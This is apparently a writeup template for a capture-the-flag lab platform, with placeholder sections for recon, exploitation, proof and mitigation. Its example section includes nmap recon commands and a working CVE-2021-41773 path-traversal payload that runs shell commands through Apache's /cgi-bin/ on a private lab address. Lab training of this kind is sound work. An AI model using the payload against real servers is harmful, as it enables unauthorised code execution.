# Pwn Writeup — {Machine Name}

> **Player:** @{your-github-username}
> **Machine:** {machine-slug}
> **Date:** YYYY-MM-DD
> **Difficulty:** Easy / Medium / Hard

---

## 1. Summary

One paragraph (2-4 sentences). What is the vulnerability, what did you exploit, what did you achieve?

> Example: "Bee-Path runs Apache 2.4.49, vulnerable to CVE-2021-41773. The misconfigured `Require all granted` directive combined with the path-normalization bug allows directory traversal. With `mod_cgi` enabled, this escalates to remote code execution via `/cgi-bin/`, granting access to `/root/flag.txt`."

---

## 2. Recon

What did you find when you first looked at the target? Include only the steps that were useful — skip dead ends unless they add educational value.

```bash
# Example commands you ran
nmap -sV -p- 192.168.56.10
curl -I http://192.168.56.10/
```

What stood out:

- Service X on port Y, version Z
- Banner / response headers that revealed the version
- Anything else relevant

---

## 3. Vulnerability identification

How did you go from "I see a service" to "I know what to exploit"?

- The version disclosed by the banner matches CVE-XXXX-YYYY
- The default configuration leaves Z exposed
- Documentation or a public PoC confirmed the exploit path

Reference any CVE, advisory, or write-up that helped you. Always credit prior work.

---

## 4. Exploitation

Step by step — what did you actually do to get the flag?

```bash
# Show the actual payload(s) you used
curl -X POST --data "echo; cat /root/flag.txt" \
  "http://192.168.56.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

Explain why each step works. The goal is that someone reading this can
reproduce your attack on the next version of the machine without copying
your script blindly.

---

## 5. Proof

Paste the flag value you obtained:

```
FLAG{...}
```

And its SHA-256 hash (must match the public hash in the machine's README):

```bash
echo -n "FLAG{...}" | sha256sum
# Should output the exact 64-char hash from the public README
```

---

## 6. Mitigation suggestions (optional but encouraged)

What would a Blue Teamer need to do to fix this? You don't have to write the
patch yourself — but pointing out the root cause helps defenders later.

- Upgrade {component} to version X.Y or later
- Disable {feature} unless explicitly required
- Add WAF rule or input validation at layer N

---

## 7. References

- CVE: https://nvd.nist.gov/vuln/detail/CVE-XXXX-YYYY
- Vendor advisory: ...
- Public PoC: ...
- Related write-ups: ...

---

## 8. Tooling used

- Language: Python 3.x (no third-party dependencies — uses `urllib` from the standard library)
- See `exploit.py` in this folder for the automated version

---

> Reminder: the `exploit.py` you submit alongside this writeup must follow the
> standard interface defined in
> [`templates/exploit_script.py`](exploit_script.py) — exit codes `0`/`1`/`2`,
> reads `TARGET_IP` and `TARGET_PORT` from environment, prints
> `FLAG_OBTAINED:FLAG{...}` on success.